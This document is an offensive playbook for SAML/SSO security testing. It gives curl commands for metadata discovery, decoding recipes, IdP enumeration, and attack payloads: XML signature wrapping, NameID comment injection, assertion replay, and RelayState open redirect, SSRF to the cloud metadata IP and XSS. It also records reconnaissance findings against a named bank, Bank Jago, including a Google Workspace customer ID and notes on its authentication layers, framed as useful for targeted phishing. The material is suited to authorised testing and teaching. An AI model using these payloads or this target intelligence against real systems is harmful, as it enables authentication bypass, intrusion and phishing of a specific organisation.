# SAML/SSO Attack Surface Assessment

## Quick Decision Tree

```
SAML endpoint found?
├── YES → Grab metadata XML
│   ├── Extract X.509 cert → decode for org info (CN, O, validity)
│   ├── Extract entityID → customer ID, tenant info
│   ├── Extract SSO/SLO URLs → IdP identification
│   └── Test for signature bypass, replay, injection
└── NO but SSO redirect observed?
    ├── Intercept SAMLRequest in redirect → base64 decode
    ├── Check RelayState parameter → open redirect potential
    └── Enumerate IdP from redirect URL pattern
```

---

## 1. SAML Metadata Discovery

### Common Metadata Paths

```bash
# SP metadata endpoints
curl -sk "https://TARGET/saml/metadata" | xmllint --format -
curl -sk "https://TARGET/auth/saml/metadata"
curl -sk "https://TARGET/sso/saml/metadata"
curl -sk "https://TARGET/saml2/metadata"
curl -sk "https://TARGET/FederationMetadata/2007-06/FederationMetadata.xml"
curl -sk "https://TARGET/.well-known/saml-metadata"

# Dynatrace-specific (Bank Jago context)
curl -sk "https://TARGET/e/ENVIRONMENT_ID/saml/metadata"
curl -sk "https://TARGET/sso/saml2/metadata"

# Apache Guacamole SAML
curl -sk "https://TARGET/guacamole/api/ext/saml/callback"
curl -sk "https://TARGET/guacamole/api/ext/saml/metadata"

# Wordlist scan for SAML endpoints
ffuf -u "https://TARGET/FUZZ" -w /path/to/saml-paths.txt -mc 200,301,302
```

### SAML Path Wordlist

```
saml/metadata
saml/SSO
saml/SLO
saml2/metadata
saml2/SSO
auth/saml/metadata
auth/saml/callback
sso/saml/metadata
sso/metadata
FederationMetadata/2007-06/FederationMetadata.xml
adfs/ls
adfs/services/trust/mex
.well-known/saml-metadata
simplesaml/module.php/saml/sp/metadata.php/default-sp
simplesaml/saml2/idp/metadata.php
```

---

## 2. AuthnRequest Interception & Decoding

### Intercept via Burp/mitmproxy

Look for redirects containing `SAMLRequest` parameter:
```
GET /sso/login?SAMLRequest=BASE64_BLOB&RelayState=https://app.target.com&SigAlg=...
```

### Decode SAMLRequest

```bash
# HTTP-Redirect binding (deflate + base64)
echo "BASE64_SAML_REQUEST" | base64 -d | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(),-15))" | xmllint --format -

# HTTP-POST binding (just base64)
echo "BASE64_SAML_REQUEST" | base64 -d | xmllint --format -

# One-liner with URL decode first
python3 -c "import urllib.parse,base64,zlib,sys; print(zlib.decompress(base64.b64decode(urllib.parse.unquote(sys.argv[1])),-15).decode())" "URL_ENCODED_SAML"
```

### Decode SAMLResponse

```bash
# POST-binding SAMLResponse (base64 only, no deflate)
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format -

# Extract assertions
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --xpath "//*[local-name()='Assertion']" -
```

### Key Fields to Extract

```bash
# From SAMLRequest
xmllint --xpath "string(//*[local-name()='AuthnRequest']/@Destination)" decoded.xml
xmllint --xpath "string(//*[local-name()='Issuer'])" decoded.xml
xmllint --xpath "string(//*[local-name()='AuthnRequest']/@AssertionConsumerServiceURL)" decoded.xml

# From SAMLResponse
xmllint --xpath "//*[local-name()='X509Certificate']/text()" decoded.xml
xmllint --xpath "string(//*[local-name()='Issuer'])" decoded.xml
xmllint --xpath "//*[local-name()='AttributeStatement']" decoded.xml
```

---

## 3. IdP Enumeration

### Google Workspace

```bash
# Google SAML SSO URL pattern reveals idpid and customer ID
# https://accounts.google.com/o/saml2/idp?idpid=C02tekxn2
# Customer ID format: C0xxxxxxx

# Enumerate Google Workspace admin info from customer ID
curl -s "https://www.google.com/a/cpanel/DOMAIN/ServiceLogin"

# Google Workspace SAML metadata
curl -s "https://accounts.google.com/o/saml2/idp?idpid=CUSTOMER_ID" 

# From Bank Jago Dynatrace: Customer ID C02tekxn2 leaked in SAML metadata
# This confirms Google Workspace as IdP and reveals org identifier
```

### Okta

```bash
# Okta tenant discovery from SAML metadata
# entityID format: http://www.okta.com/APPID
# SSO URL: https://TENANT.okta.com/app/APP_NAME/APPID/sso/saml

# Extract Okta tenant from metadata
curl -sk "https://TARGET/saml/metadata" | grep -oP 'https://[^"]+\.okta\.com[^"]*'

# Okta well-known
curl -s "https://TENANT.okta.com/.well-known/openid-configuration"
curl -s "https://TENANT.okta.com/api/v1/meta/types/user" 
```

### Azure AD / Entra ID

```bash
# Azure AD tenant discovery
# entityID: https://sts.windows.net/TENANT_ID/
# SSO URL: https://login.microsoftonline.com/TENANT_ID/saml2

# Extract tenant ID from SAML metadata
curl -sk "https://TARGET/saml/metadata" | grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'

# Azure AD metadata
curl -s "https://login.microsoftonline.com/TENANT_ID/federationmetadata/2007-06/federationmetadata.xml"
curl -s "https://login.microsoftonline.com/TENANT_ID/.well-known/openid-configuration"

# Tenant recon from domain
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@TARGET_DOMAIN"
```

---

## 4. SAML-Specific Attacks

### 4.1 XML Signature Wrapping (XSW)

Inject a second unsigned assertion that the application processes instead of the signed one.

```xml
<!-- XSW Attack: Clone assertion, modify clone, move signature -->
<samlp:Response>
  <saml:Assertion ID="evil">  <!-- Unsigned, processed by app -->
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="legit">  <!-- Signed, verified by crypto -->
    <ds:Signature>
      <ds:Reference URI="#legit"/>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>attacker@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Tools:**
```bash
# SAML Raider (Burp extension) - automated XSW variants
# SAMLExtractor
python3 SAMLExtractor.py --url https://TARGET

# Manual: 8 XSW variants exist (XSW1-XSW8)
# Test each by moving/wrapping signed elements
```

### 4.2 XML Comment Injection

Bypass NameID validation by injecting XML comments:

```xml
<!-- Original -->
<saml:NameID>attacker@target.com</saml:NameID>

<!-- Attack: comment splits the value -->
<saml:NameID>admin@target.com<!--INJECTED-->.attacker.com</saml:NameID>

<!-- Some parsers read: admin@target.com -->
<!-- Validation sees: admin@target.com.attacker.com -->
```

```bash
# Test in intercepted SAMLResponse
# Decode → inject comment in NameID → re-encode → replay
```

### 4.3 SAML Replay Attack

```bash
# Capture valid SAMLResponse
# Replay after session expires - check if NotOnOrAfter is enforced

# Check conditions
xmllint --xpath "//*[local-name()='Conditions']/@NotOnOrAfter" response.xml
xmllint --xpath "//*[local-name()='Conditions']/@NotBefore" response.xml

# If no InResponseTo validation:
# Replay captured SAMLResponse to ACS URL
curl -X POST "https://TARGET/saml/acs" \
  -d "SAMLResponse=BASE64_CAPTURED_RESPONSE&RelayState=https://TARGET/dashboard"
```

### 4.4 RelayState Manipulation

```bash
# Open redirect via RelayState
curl -v "https://TARGET/saml/login?RelayState=https://evil.com"

# SSRF via RelayState (if server fetches the URL)
curl -v "https://TARGET/saml/login?RelayState=http://169.254.169.254/latest/meta-data/"

# XSS via RelayState (if reflected without encoding)
curl -v "https://TARGET/saml/login?RelayState=javascript:alert(1)"
```

### 4.5 Additional Attacks

```bash
# Signature exclusion - remove Signature element entirely
# Some SPs don't enforce signature validation

# Certificate confusion - supply attacker's cert in KeyInfo
# SP uses embedded cert instead of pre-configured one

# XSLT injection in SAML transforms
# XXE in SAML XML parsing
```

---

## 5. SSO Information Leakage

### X.509 Certificate Analysis

```bash
# Extract cert from SAML metadata
xmllint --xpath "//*[local-name()='X509Certificate']/text()" metadata.xml > cert.b64

# Decode and analyze
base64 -d cert.b64 | openssl x509 -inform DER -text -noout

# Key fields to note:
# - Subject CN (organization name)
# - Issuer (CA info)
# - Validity dates (operational timeline)
# - Subject Alternative Names

# One-liner extract + decode
curl -sk "https://TARGET/saml/metadata" | \
  xmllint --xpath "//*[local-name()='X509Certificate'][1]/text()" - | \
  base64 -d | openssl x509 -inform DER -text -noout
```

### Bank Jago Context: Dynatrace SAML Findings

```
Finding: Dynatrace SAML metadata exposed
- X.509 Certificate CN=Dynatrace
- Validity: 2020-2030 (10-year cert, long-lived key)
- Google Workspace Customer ID: C02tekxn2
- Confirms: Bank Jago uses Google Workspace as IdP for Dynatrace
- Risk: Customer ID enables targeted phishing, IdP enumeration

Apache Guacamole:
- Behind Google IAP + SAML authentication
- IAP provides first layer, SAML provides second
- If IAP bypass found → SAML becomes sole auth barrier
- Check: /guacamole/api/ext/saml/* endpoints accessible?
```

### Entity ID Intelligence

```bash
# Entity IDs reveal:
# - Internal hostnames
# - Environment IDs  
# - Tenant identifiers
# - Application names

# Common entityID patterns:
# Dynatrace: https://ENVID.live.dynatrace.com/saml/metadata
# Google: https://accounts.google.com/o/saml2?idpid=CUSTOMER_ID
# Okta: http://www.okta.com/EXTERNALID
# Azure: https://sts.windows.net/TENANT_GUID/

# Extract all entityIDs from metadata
xmllint --xpath "string(//*[local-name()='EntityDescriptor']/@entityID)" metadata.xml
```

### Customer ID / Tenant Leakage

```bash
# Google Workspace Customer ID → Admin console access attempt
# Format: C0xxxxxxx (e.g., C02tekxn2)
# Used in: Google Admin SDK, Directory API, SAML config

# What you can do with a Customer ID:
# 1. Confirm organization uses Google Workspace
# 2. Attempt Google Groups enumeration
# 3. Target phishing with correct IdP branding
# 4. Correlate with other Google service leaks

# Azure Tenant ID → enumerate users
# https://login.microsoftonline.com/TENANT_ID/v2.0/.well-known/openid-configuration

# Okta org → app enumeration
# https://TENANT.okta.com/api/v1/apps (if misconfigured)
```

---

## 6. Exploitation Workflow

```
1. DISCOVER
   └── Scan for /saml/metadata, /sso/*, federation endpoints
   
2. EXTRACT
   ├── Download metadata XML
   ├── Decode X.509 certs
   ├── Note entityIDs, ACS URLs, SSO URLs
   └── Identify IdP (Google/Okta/Azure/ADFS)

3. INTERCEPT
   ├── Capture SAMLRequest (login flow)
   ├── Capture SAMLResponse (if possible via phishing/MitM)
   └── Note RelayState handling

4. ANALYZE
   ├── Check signature validation (remove sig, does it still work?)
   ├── Check replay protection (NotOnOrAfter, InResponseTo)
   ├── Check NameID handling (comment injection)
   └── Check RelayState (open redirect, XSS, SSRF)

5. ATTACK
   ├── XSW variants (SAML Raider)
   ├── Signature stripping
   ├── Comment injection in NameID
   ├── Replay captured responses
   └── RelayState abuse

6. REPORT
   ├── Information disclosure (certs, customer IDs, entity IDs)
   ├── Authentication bypass (if XSW/replay works)
   ├── Open redirect (RelayState)
   └── Crypto weaknesses (long-lived certs, weak algorithms)
```

---

## 7. Tools

| Tool | Use |
|------|-----|
| SAML Raider (Burp) | XSW attacks, signature manipulation |
| SAMLTool (samltool.com) | Online decode/encode |
| xmllint | XML parsing/XPath |
| openssl | Certificate analysis |
| Burp Suite | Intercept SAML flows |
| EvilSAML | Generate malicious responses |
| saml2aws | CLI SAML auth testing |

---

## References

- [SAML Security Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
- [On Breaking SAML (Somorovsky et al.)](https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky)
- [SAML Raider](https://github.com/SAMLRaider/SAMLRaider)
- [Duo SAML Vulnerabilities Research](https://duo.com/blog/duo-finds-saml-vulnerabilities)
